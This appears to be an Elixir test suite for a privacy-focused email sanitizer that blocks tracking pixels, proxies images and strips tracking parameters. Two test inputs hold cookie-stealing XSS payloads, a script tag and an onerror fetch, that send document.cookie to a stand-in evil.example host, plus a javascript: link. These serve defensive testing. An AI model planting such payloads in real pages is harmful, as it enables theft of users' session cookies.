defmodule PrivacyMail.EmailTest do
  use ExUnit.Case, async: true

  alias PrivacyMail.Email
  alias PrivacyMail.Proxy.Token

  @secret "test-proxy-secret-please-change"

  defp opts(extra \\ []) do
    Keyword.merge([secret: @secret, proxy_base_url: "https://mail.example/p"], extra)
  end

  test "replaces high-confidence tracking pixel with local transparent pixel" do
    html = """
    <html><body>
      <img src="https://t.example.com/track/open.gif?e=ceo@example.com"
           width="1" height="1" style="display:none" alt="">
      <p>Quarterly statement is ready.</p>
    </body></html>
    """

    {:ok, safe, report} = Email.privatize(html, opts())

    assert report.counts.trackers_blocked == 1
    assert report.counts.images_proxied == 0
    assert safe =~ "data:image/gif;base64,R0lGOD"
    refute safe =~ "t.example.com/track/open.gif"
    assert safe =~ "width=\"1\""
    assert safe =~ "Quarterly statement"
  end

  test "rewrites normal image and srcset through signed lazy proxy" do
    html = """
    <img src="https://cdn.example.com/banner.jpg?utm_source=news"
         srcset="https://cdn.example.com/banner-2x.jpg 2x, https://cdn.example.com/banner.jpg 1x"
         width="600" height="200" alt="Banner">
    """

    {:ok, safe, report} = Email.privatize(html, opts())

    assert report.counts.trackers_blocked == 0
    assert report.counts.images_proxied >= 1
    assert safe =~ "/proxy/image?token=v1.img."
    assert safe =~ "loading=\"lazy\""
    assert safe =~ "decoding=\"async\""
    assert safe =~ "alt=\"Banner\""
    # utm_source is removed before signing; raw campaign URL is not in HTML.
    refute safe =~ "utm_source=news"
    refute safe =~ "https://cdn.example.com/banner.jpg"
  end

  test "rewrites inline CSS background images" do
    html = """
    <table><tr><td style="background-image:url('https://cdn.example.com/hero.jpg');width:600px;height:200px">
      Hello
    </td></tr></table>
    """

    {:ok, safe, report} = Email.privatize(html, opts())

    assert safe =~ "/proxy/image?token="
    assert Enum.any?(report.images, &(&1.location == :inline_style))
  end

  test "neutralizes tracking CSS background beacon" do
    html = """
    <div style="background:url(https://tr.example.com/pixel.gif?recipient_id=abc123long) ;width:1px;height:1px"></div>
    """

    {:ok, safe, report} = Email.privatize(html, opts())

    assert report.counts.trackers_blocked >= 1
    refute safe =~ "tr.example.com/pixel.gif"
    assert safe =~ "data:image/gif;base64"
  end

  test "sanitizes tracking link and preserves functional id" do
    html = ~s(<a href="https://shop.example/order/123?utm_campaign=may&mc_eid=abc">View order</a>)

    {:ok, safe, report} = Email.privatize(html, opts())

    assert safe =~ "/order/123"
    refute safe =~ "utm_campaign=may"
    refute safe =~ "mc_eid=abc"
    assert safe =~ "rel=\"noopener noreferrer\""
    assert report.counts.links_sanitized >= 1
  end

  test "wraps personalized links in signed redirect gateway" do
    html =
      ~s(<a href="https://login.example/verify?email=ceo%40example.com&token=abcdef1234567890">Verify</a>)

    {:ok, safe, report} = Email.privatize(html, opts())

    assert safe =~ "/redirect?token=v1.go."
    assert report.counts.personalized_links == 1
  end

  test "leaves cid, data and mailto references untouched" do
    html = """
    <img src="cid:logo123">
    <img src="data:image/png;base64,AAAA">
    <a href="mailto:support@example.com">mail</a>
    """

    {:ok, safe, report} = Email.privatize(html, opts())

    assert safe =~ "cid:logo123"
    assert safe =~ "data:image/png;base64,AAAA"
    assert safe =~ "mailto:support@example.com"
    assert report.counts.images == 0
  end

  test "analyze/2 does not rewrite and returns findings" do
    html =
      ~s(<img src="https://t.example/track/pixel.gif" width="1" height="1" style="display:none">)

    report = Email.analyze(html, opts())

    assert report.counts.trackers_blocked == 1
    assert is_nil(report.html)
  end

  test "strips active content by default" do
    html =
      ~S[<p>Hello</p><script>new Image().src="https://evil.example/x?c="+document.cookie</script>]

    {:ok, safe, report} = Email.privatize(html, opts())

    refute safe =~ "<script"
    assert safe =~ "Hello"
    assert report.counts.active_content_removed == 1
  end

  test "uses content base for relative URLs but proxy_base_url for rewritten src" do
    html = ~s(<img src="/assets/logo.jpg" width="120" height="40" alt="Logo">)

    {:ok, safe, _report} =
      Email.privatize(
        html,
        secret: @secret,
        base_url: "https://content.example/mail/123",
        proxy_base_url: "https://proxy.example/privacy"
      )

    assert safe =~ "https://proxy.example/privacy/proxy/image?token="
    token = Regex.run(~r/token=([^"]+)/, safe) |> Enum.at(1) |> URI.decode_www_form()
    assert {:ok, "https://content.example/assets/logo.jpg"} = Token.verify_image(token, @secret)
  end

  test "removes inline event handlers and neutralizes javascript URLs" do
    html =
      ~S[<img src="https://cdn.example/a.jpg" onerror="fetch('https://evil.example?c='+document.cookie)"><a href="javascript:alert(1)">click</a>]

    {:ok, safe, _report} = Email.privatize(html, opts())

    refute safe =~ "onerror"
    refute safe =~ "javascript:alert"
    assert safe =~ "href=\"#\""
  end
end
